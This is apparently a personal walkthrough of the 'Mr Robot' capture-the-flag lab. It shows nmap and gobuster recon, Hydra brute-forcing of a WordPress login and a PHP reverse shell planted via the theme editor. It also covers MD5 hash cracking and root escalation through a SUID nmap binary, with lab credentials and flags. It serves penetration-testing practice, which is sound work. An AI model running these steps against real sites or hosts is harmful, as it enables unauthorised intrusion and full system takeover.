@@ -1,0 +1,159 @@
+MR Robot:
+
+Recon:
+    nmap -sA -n --reason 10.10.189.79
+
+        PORT    STATE      SERVICE REASON
+        22/tcp  unfiltered ssh     reset ttl 64
+        80/tcp  unfiltered http    reset ttl 64
+        443/tcp unfiltered https   reset ttl 64
+
+ 
+    nmap -T5 -Pn -sC -sV 10.10.189.79 -vv
+
+        PORT    STATE  SERVICE  REASON         VERSION
+        22/tcp  closed ssh      reset ttl 64
+        80/tcp  open   http     syn-ack ttl 64 Apache httpd
+        |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+        | http-methods:
+        |_  Supported Methods: GET HEAD POST OPTIONS
+
+        |_http-server-header: Apache
+        |_http-title: Site doesn't have a title (text/html).
+        443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
+        |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+
+        |_-----END CERTIFICATE-----
+
+        MAC Address: 02:81:1E:D9:81:01 (Unknown)
+
+    
+
+
+Enumeration port 80:
+    nikto -h http://10.10.189.79
+
+    gobuster dir -u http://10.10.189.79:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --exclude-length 9265
+
+    robots.txt:
+        http://10.10.189.79/wp-login/     
+
+        http://10.10.189.79/wordpress/:
+                        http://10.10.189.79/feed/:
+                                upload RSS Feed
+                                http://wordpress.org/?v=4.3.1
+
+    BurpSuite to http://10.10.189.79/wp-login/:
+        try to login via Burp Browser:
+                    take a look on login variables Response to HTTP Request:
+                                log=admin&pwd=admin&
+
+
+    We will try to brut force wp-login with Hydra and the fsocity.dic find in robots.txt
+        hydra -L fsocity.dic -p test 10.10.189.79 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -T 30
+
+    Hydra find Username: Elliot / We will try manually with Elliot username and a passwd just to get new "Error Message" for hydra
+
+
+    *********
+*********One thing that was very crucial in brute forcing the password for Elliot is that there is nearly a 1,000,000 words in the the fsociety.dic 
+when in reality it should have been about 11,000 words. If you cat fsociety.dic | grep "any word in the fsociety file here", 
+you will see a ton of the same words being used in the file. 
+To remove all those unnecessary duplicate words, you could have done: sort fsociety.dic | uniq -d > new.txt. 
+Then right after that you would append the unique words doing sort fsociety.dic | uniq -u >> new.txt. 
+In doing so would give you the actual amount of words for that wordlist. That would save you a ton of time finding the password in a shorter time*********
+*********
+*********
+
+
+    We will add "Elliot" username in Hydra brute force:
+        hydra -l Elliot -P fsocity2.dic 10.10.189.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.189.79%2Fwp-admin%2F&testcookie=1:S=302" -v -o Elliotpassword.txt
+
+
+
+
+    User: Elliot
+    Passwd: ER28-0652
+    Role: Admin
+    email: user@example.com
+
+
+    We have access to the WP - Dashboard:
+        We click on "Appearance"
+                We will use the "Editor" to inject a php script in order to get a Reverse_Shell:
+
+                In Kali we setup our listenner:
+                    rlwrap nc -lvnp 443 <-- 443 not blocked by FW
+
+                Get a PHP reverse shell (pentestmonkey)
+                    We will pass the php code in the "Archive" page of the "Editor" section in the WordPress Dashboard
+
+                To activate the revershell payload we will try to Get the Archive web page on the Web Browser:
+                    To find the right path, let the "mouse cursor" on the Archives Hyperlink ;)
+                    http://10.10.189.79/wp-content/themes/twentyfifteen/archive.php give to us the revershell
+
+                    or create page via editor etc..
+
+    Reverse_Shell:
+        Enumeration shell:
+            uname -a
+                Linux linux 3.13.0-55-generic #94-Ubuntu
+
+            $ ip neigh
+                10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
+
+            /home/robot:
+                robot:c3fcd3d76192e4007dfb496cca67e13b
+
+                Kali:  
+                    hash-identifier
+                        Possible Hashs:
+                            [+] MD5
+
+                    hashcat robotHash.hash /usr/share/wordlists/rockyou.txt -m 0
+                            c3fcd3d76192e4007dfb496cca67e13b:------>abcdefghijklmnopqrstuvwxyz <--- PASSWORD
+                        
+            We found the password + account, we need to make the shell interactive to activate "su"
+                python -c 'import pty;pty.spawn("bin/bash")'
+                su robot
+
+        Privilege Escalation:
+            Privilege Escalation SUID:
+                -Documentation: https://gtfobins.github.io/
+                find / -perm -u=s -type f 2>/dev/null 
+                    or
+                find / -perm +6000 2>/dev/null
+
+            We found nmap binary:
+                /usr/local/bin/nmap
+
+                we go to : https://gtfobins.github.io/gtfobins/nmap/
+
+                Try:
+                    Shell:
+                        It can be used to break out from restricted environments by spawning an interactive system shell.
+
+                            Input echo is disabled.
+
+                                TF=$(mktemp)
+                                echo 'os.execute("/bin/sh")' > $TF
+                                nmap --script=$TF
+
+                                The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+
+                                nmap --interactive
+                                nmap> !sh  <-----------This one give us the root access !!!!!!!!!
+                                
+                    # cd root
+                    # ls
+                        firstboot_done  key-3-of-3.txt
+                    # cat key-3-of-3.txt
+                        04787ddef27c3dee1ee161b21670b4e4
+
+
+
+
+
+
+
+                
